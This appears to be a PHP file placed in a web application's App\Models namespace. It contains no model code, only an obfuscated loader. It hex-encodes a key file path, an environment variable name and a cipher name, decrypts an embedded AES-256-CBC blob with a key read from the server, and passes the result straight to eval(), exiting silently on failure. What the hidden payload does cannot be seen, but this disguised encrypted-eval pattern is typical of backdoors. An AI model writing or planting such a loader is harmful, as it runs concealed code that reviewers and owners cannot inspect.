<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('34bRe5hO1D6zk714rydu6g==');

$c=base64_decode(

'ndU9SGX2+Xl++UgRiBzxim3TE7Xfr+kp8gGNDy89x0cicKdqSV576F/J5DyyivnLiR9+yZZD+qZh' .
'8svoipo9gk8nPmRd/KTpGVyX+ZIYyZsNo/wZJ7s9+/oZ3xgLZW99mkQmTaijvPJrfAq6iTLCZ4rW' .
'Wg6SRzaqdWiW8a06DNk/+fXP7JtTMyqMc37c81GWDQCTrvUPqaoafdndZG8/m6Lx0UpAZZzLIRR7' .
'dlAjgkig1hAOjesUugTNdW0jX5fKKgJPD/9HzHJ8DA/8mxdOb34v3csdZXlKdhHGp2NO2i5sWnHA' .
'rI1eW8drewQuJOiDth/kZaKXOftpcKdqBoSZXkGgrIIzMxb1+5D+2QA3h2P13aiQbUUgx8PhdRUA' .
'wdnTpn0vpgp1a3ZZXU1svu1VqQsYnb9GMM7I58WWFVDYz4Am4RJhqbHY8q0r4peW7uRmQZSq3hWP' .
'kflqlcaIANR4UGMF0owm4HCqZrAw6TyIn1g1MqzhGgR9tJSy0PMjiOG5SBGrgOCUoOHMa+wb7xws' .
'PAVeqnUw3XM8DNTwAGSbfuKBUdauRtjpuVEHKD4xOPskG9iNL4ZiubdSLng5rg9qMXqgnD2uYwMZ' .
'YoxLM89VHew/zhQXFiGEEKwCuUhu9BfyBuK2WCDW/u6378ZxOEBpM3+acIJTQ4uPGxV5ES8/UJNF' .
'CdgxQS++vVxrxLjhb/ZodXMUQg2uDWQeI9z1VKvxgk/tr85bKalZXNBfc3Sq4nbGEIL41IKY5fmN' .
'yL/3lcvcrkxLZTOu4NPfIVK880kNFsZUHs+DMRIvWzgjuj0Elk6xEQZhDhX6pevRih4czGxM1vcr' .
'rqh/1vjdtDn5Ke8e+WUvECAVtTwQKKJk+533AbBoYV/Or2Z33pX2G/BVd1UJq+QDxM0J/QyuB8pG' .
'G1SNRU71HwttJkPDb5MAPSpvnOl3nNzSOmOA2cxF0snnWzne1GSSFg0fW5ftyYs6HHBO5Dhrtw6q' .
'gKQZCn/vW2dGnRmU5bFIGsmobh1XvWVDSJ/LYjO14CNkJGMzvFGm28+XjK0ccFIGNMw2HGd+dkoX' .
'aXb5jXgAj3ohE9nciaXy5e1VilhYh/6pO6hgs5BsRNoZk9zyFzYwwEfn+GV88yBQnBkYh9OeWelj' .
'7rqahqWL8QF5Zy/8N013vBooB6u8OrjnLWLc2Q64moNNC/i5mMlQMwn/lO8FhL2eu0Jwta1zgWCc'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

